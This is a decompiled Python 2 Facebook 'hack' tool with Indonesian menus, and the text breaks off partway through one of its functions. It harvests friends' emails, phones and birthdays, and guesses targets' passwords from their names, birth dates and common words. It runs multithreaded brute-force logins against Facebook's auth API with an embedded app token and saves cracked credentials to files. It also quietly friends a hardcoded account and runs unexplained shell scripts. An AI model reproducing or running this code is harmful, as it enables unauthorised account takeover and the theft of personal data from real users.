# TusBolled by L0V14N4DR
# My Team: Black Coder Crush, TERMUXID3, Skull Of Skill
# Python bytecode 2.7None
# Own Filename: <debby>
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; id) Presto/2.12.423 Version/12.16')]

def failed():
    print '\x1b[1;91m[!] Exit'
    os.sys.exit()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


logo = ''
bacot = 'sh run.sh'

def load():
    tiload = [
     '.   ', '..  ', '... ']
    for o in tiload:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mLoading \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
email = []
number = []
id = []
em = []
email_from_friends = []
hp = []
hpfromfriends = []
reaction = []
reactiongroup = []
comment = []
group_comment = []
listgroup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

def tool_main_function():
    os.system('clear')
    print logo
    os.system('sh run.sh')
    os.system('sh tmp.sh')
    print '\x1b[96m[\x1b[91m1\x1b[96m] \x1b[92mLogin Dengan Normal'
    print '\x1b[96m[\x1b[91m2\x1b[96m] \x1b[92mLogin Menggunakan Token'
    print '\x1b[91m[\x1b[97m0\x1b[91m]\x1b[91m Keluar'
    print ''
    login_method = raw_input('\x1b[97mChose\x1b[92m ~>\x1b[93m ')
    if login_method == '':
        print '\x1b[1;91m[!] Wrong input'
        failed()
    elif login_method == '1':
        login()
    elif login_method == '2':
        fbtoken()
    elif login_method == '0':
        failed()
    else:
        print '\x1b[1;91m[!] Wrong input'
        failed()


def login():
    os.system('clear')
    try:
        fb_token = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        os.system('sh tmp.sh')
        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN FACEBOOK \x1b[1;91m[\xe2\x98\x86]'
        id = raw_input('\x1b[1;91m[+] \x1b[1;36mID\x1b[1;97m|\x1b[1;96mEmail\x1b[1;97m \x1b[1;91m:\x1b[1;92m ')
        pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ')
        load()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;91m[!] No connection'
            failed()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                pick = open('login.txt', 'w')
                pick.write(z['access_token'])
                pick.close()
                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin Succesfuly'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91m[!] No connection'
                failed()

        if 'checkpoint' in url:
            print '\n\x1b[1;91m[!] \x1b[1;93mAkun Anda Cekpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            failed()
        else:
            print '\n\x1b[1;91m[!] Login Failed'
            os.system('rm -rf login.txt')
            time.sleep(0.01)
            login()


def fbtoken():
    os.system('clear')
    print logo
    os.system('sh tmp.sh')
    fb_token = raw_input('\x1b[1;91m[?] \x1b[1;92mToken\x1b[1;91m : \x1b[1;97m')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + fb_token)
        a = json.loads(otw.text)
        fb_name = a['name']
        pick = open('login.txt', 'w')
        pick.write(fb_token)
        pick.close()
        menu()
    except KeyError:
        print '\x1b[1;91m[!] Wrong'
        e = raw_input('\x1b[1;91m[?] \x1b[1;92mIngin Mengambil Token?\x1b[1;97m[y/n]: ')
        if e == '':
            failed()
        elif e == 'y':
            login()
        else:
            failed()


def menu():
    os.system('clear')
    try:
        fb_token = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + fb_token)
        a = json.loads(otw.text)
        fb_name = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;91m[!] \x1b[1;93mAkun Anda Checkpoint'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[!] No connection'
        failed()

    os.system('reset')
    print logo
    os.system('sh tmp.sh')
    print '\x1b[1;97m\xe2\x95\x94' + 40 * '\xe2\x95\x90'
    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Name \x1b[1;91m: \x1b[1;92m' + fb_name + '\x1b[1;97m'
    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m ID   \x1b[1;91m: \x1b[1;92m' + id
    print '\x1b[1;97m\xe2\x95\x9a' + 40 * '\xe2\x95\x90'
    print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;92m1.\x1b[1;97m Informasi Pengguna'
    print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;92m2.\x1b[1;97m Hack Akun Facebook               '
    print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;92m3.\x1b[1;97m Lihat Token       '
    print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;92m0.\x1b[1;97m LogOut            '
    print '\xe2\x95\x91'
    choices()


def choices():
    pick = raw_input('\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m>>> \x1b[1;97m')
    if pick == '':
        print '\x1b[1;91m[!] Wrong input'
        choices()
    elif pick == '1':
        information()
    elif pick == '2':
        menu_hack()
    elif pick == '3':
        os.system('clear')
        print logo
        os.system('sh tmp.sh')
        fb_token = open('login.txt', 'r').read()
        print '\x1b[1;91m[+] \x1b[1;92mYour token\x1b[1;91m :\x1b[1;97m ' + fb_token
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()
    elif pick == '0':
        os.system('rm -rf login.txt')
        os.system('xdg-open https://www.facebook.com/rizz.magizz')
        failed()
    else:
        print '\x1b[1;91m[!] Wrong input'
        choices()


def information():
    os.system('clear')
    try:
        fb_token = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    aid = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID\x1b[1;97m/\x1b[1;92mName\x1b[1;91m : \x1b[1;97m')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait Tunggu Sebentar \x1b[1;97m...')
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + fb_token)
    cok = json.loads(r.text)
    for i in cok['data']:
        if aid in i['name'] or aid in i['id']:
            x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + fb_token)
            z = json.loads(x.text)
            print 42 * '\x1b[1;97m\xe2\x95\x90'
            try:
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama\x1b[1;97m          : ' + z['name']
            except KeyError:
                print '\x1b[1;91m[?] \x1b[1;92mNama\x1b[1;97m          : \x1b[1;91mNot found'

            try:
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID\x1b[1;97m            : ' + z['id']
            except KeyError:
                print '\x1b[1;91m[?] \x1b[1;92mID\x1b[1;97m            : \x1b[1;91mNot found'

            try:
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail\x1b[1;97m         : ' + z['email']
            except KeyError:
                print '\x1b[1;91m[?] \x1b[1;92mEmail\x1b[1;97m         : \x1b[1;91mNot found'

            try:
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mTelephone\x1b[1;97m     : ' + z['mobile_phone']
            except KeyError:
                print '\x1b[1;91m[?] \x1b[1;92mTelepon\x1b[1;97m     : \x1b[1;91mNot found'

            try:
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mLocation\x1b[1;97m      : ' + z['location']['name']
            except KeyError:
                print '\x1b[1;91m[?] \x1b[1;92mLokasi\x1b[1;97m      : \x1b[1;91mNot found'

            try:
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mDate of birth\x1b[1;97m : ' + z['birthday']
            except KeyError:
                print '\x1b[1;91m[?] \x1b[1;92mTanggal Lahir\x1b[1;97m : \x1b[1;91mNot found'
            except KeyError:
                print '\x1b[1;91m                   ~ \x1b[1;91mNot found'
            except KeyError:
                pass

            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
    else:
        print '\x1b[1;91m[\xe2\x9c\x96] User Tidak Diketahui'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()


def menu_hack():
    os.system('clear')
    try:
        fb_token = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    os.system('sh tmp.sh')
    print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;92m1.\x1b[1;97m Mini Hack Facebook(\x1b[1;92mTarget\x1b[1;97m)'
    print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;92m2.\x1b[1;97m Multi Bruteforce Facebook'
    print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;92m3.\x1b[1;97m Super Multi Bruteforce Facebook'
    print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;92m4.\x1b[1;97m BruteForce(\x1b[1;92mTarget\x1b[1;97m)'
    print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;92m5.\x1b[1;97m Yahoo Checker'
    print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;91m0.\x1b[1;97m Back'
    print '\xe2\x95\x91'
    choose_hack()


def choose_hack():
    hack = raw_input('\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m>>> \x1b[1;97m')
    if hack == '':
        print '\x1b[1;91m[!] Wrong input'
        choose_hack()
    elif hack == '1':
        mini()
    elif hack == '2':
        crack()
        success()
    elif hack == '3':
        super()
    elif hack == '4':
        brute()
    elif hack == '5':
        menu_yahoo()
    elif hack == '0':
        menu()
    else:
        print '\x1b[1;91m[!] Wrong input'
        choose_hack()


def mini():
    os.system('clear')
    try:
        fb_token = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;97m[\x1b[1;91mINFO\x1b[1;97m] \x1b[1;91mTarget Harus Berteman Dengan Akun Anda\n       with your account first!'
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    try:
        id = raw_input('\x1b[1;91m[+] \x1b[1;92mId Target \x1b[1;91m:\x1b[1;97m ')
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu Sebentar\x1b[1;97m...')
        r = requests.get('https://graph.facebook.com/' + id + '?access_token=' + fb_token)
        a = json.loads(r.text)
        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama\x1b[1;97m : ' + a['name']
        jalan('\x1b[1;91m[+] \x1b[1;92mCheck \x1b[1;97m...')
        time.sleep(2)
        jalan('\x1b[1;91m[+] \x1b[1;92mMembuka password \x1b[1;97m...')
        time.sleep(2)
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        pz1 = a['first_name'] + '123'
        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
        y = json.load(data)
        if 'access_token' in y:
            print '\x1b[1;91m[+] \x1b[1;92mBerhasil...'
            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_hack()
        elif 'www.facebook.com' in y['error_msg']:
            print '\x1b[1;91m[!] \x1b[1;93mCheckpoint'
            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_hack()
        else:
            pz2 = a['first_name'] + '12345'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            y = json.load(data)
            if 'access_token' in y:
                print '\x1b[1;91m[+] \x1b[1;92mBerhasil'
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                menu_hack()
            elif 'www.facebook.com' in y['error_msg']:
                print '\x1b[1;91m[!] \x1b[1;93mCheckpoint'
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                menu_hack()
            else:
                pz3 = a['last_name'] + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                y = json.load(data)
                if 'access_token' in y:
                    print '\x1b[1;91m[+] \x1b[1;92mBerhasil'
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                    menu_hack()
                elif 'www.facebook.com' in y['error_msg']:
                    print '\x1b[1;91m[!] \x1b[1;93mCheckpoint'
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                    menu_hack()
                else:
                    lahir = a['birthday']
                    pz4 = lahir.replace('/', '')
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    y = json.load(data)
                    if 'access_token' in y:
                        print '\x1b[1;91m[+] \x1b[1;92mBerhasil'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                        menu_hack()
                    elif 'www.facebook.com' in y['error_msg']:
                        print '\x1b[1;91m[!] \x1b[1;93mCheckpoint'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                        menu_hack()
                    else:
                        lahirs = a['birthday']
                        gaz = lahirs.replace('/', '')
                        pz5 = a['first_name'] + gaz
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        y = json.load(data)
                        if 'access_token' in y:
                            print '\x1b[1;91m[+] \x1b[1;92mBerhasil'
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz5
                            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                            menu_hack()
                        elif 'www.facebook.com' in y['error_msg']:
                            print '\x1b[1;91m[!] \x1b[1;93mCheckpoint'
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz5
                            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                            menu_hack()
                        else:
                            pz6 = 'bintang123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            y = json.load(data)
                            if 'access_token' in y:
                                print '\x1b[1;91m[+] \x1b[1;92mBerhasil'
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz6
                                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                menu_hack()
                            elif 'www.facebook.com' in y['error_msg']:
                                print '\x1b[1;91m[!] \x1b[1;93mCheckpoint'
                                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz6
                                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                menu_hack()
                            else:
                                pz7 = 'sayang123, sayang, bintang, bajingan, someone, anjing, pukimak, playboy, doraemon, bahagia'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                y = json.load(data)
                                if 'access_token' in y:
                                    print '\x1b[1;91m[+] \x1b[1;92mBerhasil'
                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz7
                                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                    menu_hack()
                                elif 'www.facebook.com' in y['error_msg']:
                                    print '\x1b[1;91m[!] \x1b[1;93mCheckpoint'
                                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz6
                                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                    menu_hack()
                                else:
                                    print '\x1b[1;91m[!] Maaf Gagal Membuka Password :('
                                    print '\x1b[1;91m[!] Coba Cara Lain'
                                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                    menu_hack()
    except KeyError:
        print '\x1b[1;91m[!] Terget Tidak Ditemukan'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu_hack()


def crack():
    global file
    global idlist
    global passw
    os.system('clear')
    try:
        fb_token = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    os.system('sh tmp.sh')
    idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID  \x1b[1;91m: \x1b[1;97m')
    passw = raw_input('\x1b[1;91m[+] \x1b[1;92mPassword \x1b[1;91m: \x1b[1;97m')
    try:
        file = open(idlist, 'r')
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
        for x in range(40):
            pick = threading.Thread(target=scrak, args=())
            pick.start()
            threads.append(pick)

        for pick in threads:
            pick.join()

    except IOError:
        print '\x1b[1;91m[!] File not found'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu_hack()


def scrak():
    global action_failed
    global back
    global checkpoint
    global sucessful
    global up
    try:
        os.mkdir('out')
    except OSError:
        pass

    try:
        open_it = open(idlist, 'r')
        up = open_it.read().split()
        while file:
            username = file.readline().strip()
            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            data = urllib.urlopen(url)
            mpsh = json.load(data)
            if back == len(up):
                break
            if 'access_token' in mpsh:
                bisa = open('out/mbf_ok.txt', 'w')
                bisa.write(username + '|' + passw + '\n')
                bisa.close()
                x = requests.get('https://graph.facebook.com/' + username + '?access_token=' + mpsh['access_token'])
                z = json.loads(x.text)
                sucessful.append('\x1b[1;97m[ \x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m ] ' + username + '|' + passw + ' =>' + z['name'])
            elif 'www.facebook.com' in mpsh['error_msg']:
                cek = open('out/mbf_cp.txt', 'w')
                cek.write(username + '|' + passw + '\n')
                cek.close()
                checkpoint.append('\x1b[1;97m[ \x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m ] ' + username + '|' + passw)
            else:
                action_failed.append(username)
                back += 1
            sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack    \x1b[1;91m:\x1b[1;97m ' + str(back) + ' \x1b[1;96m>\x1b[1;97m ' + str(len(up)) + ' =>\x1b[1;92mLive\x1b[1;91m:\x1b[1;96m' + str(len(sucessful)) + ' \x1b[1;97m=>\x1b[1;93mCheck\x1b[1;91m:\x1b[1;96m' + str(len(checkpoint)))
            sys.stdout.flush()

    except IOError:
        print '\n\x1b[1;91m[!] Sleep'
        time.sleep(0.01)
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] No connection'


def success():
    print
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    for b in sucessful:
        print b

    for c in checkpoint:
        print c

    print 42 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[31m[x] Gagal \x1b[1;97m--> ' + str(len(action_failed))
    failed()


def super():
    global fb_token
    os.system('clear')
    try:
        fb_token = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.0)
        login()

    os.system('clear')
    print logo
    os.system('sh tmp.sh')
    print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;92m1.\x1b[1;97m Crack Dari Daftar Teman'
    print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;92m2.\x1b[1;97m Crack Teman Dari Teman'
    print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;92m3.\x1b[1;97m Crack Dari File'
    print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;91m0.\x1b[1;97m Back'
    print '\xe2\x95\x91'
    choices_super()


def choices_super():
    global oks
    peak = raw_input('\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m>>> \x1b[1;97m')
    if peak == '':
        print '\x1b[1;91m[!] Wrong input'
        choices_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMengambil Id Teman\x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + fb_token)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif peak == '2':
            os.system('clear')
            print logo
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan Id Teman \x1b[1;91m: \x1b[1;97m')
            try:
                seat = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + fb_token)
                op = json.loads(seat.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Friend not found'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                super()

            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMengambil Id Dari Teman\x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + fb_token)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif peak == '3':
            os.system('clear')
            print logo
            try:
                idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID  \x1b[1;91m: \x1b[1;97m')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;91m[!] File Tidak Ditemukan'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                super()

        elif peak == '0':
            menu_hack()
        else:
            print '\x1b[1;91m[!] Wrong input'
            choices_super()
        print '\x1b[1;91m[+] \x1b[1;92mTotal ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
        tiload = ['.   ', '..  ', '... ']
        for o in tiload:
            print '\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;97m' + o,
            sys.stdout.flush()
            time.sleep(1)

    print
    print 42 * '\x1b[1;97m\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + fb_token)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                z = json.loads(x.text)
                print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass1 + ' =>' + z['name']
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                cek = open('out/super_cp.txt', 'a')
                cek.write(user + '|' + pass1 + '\n')
                cek.close()
                checkpoint.append(user + pass1)
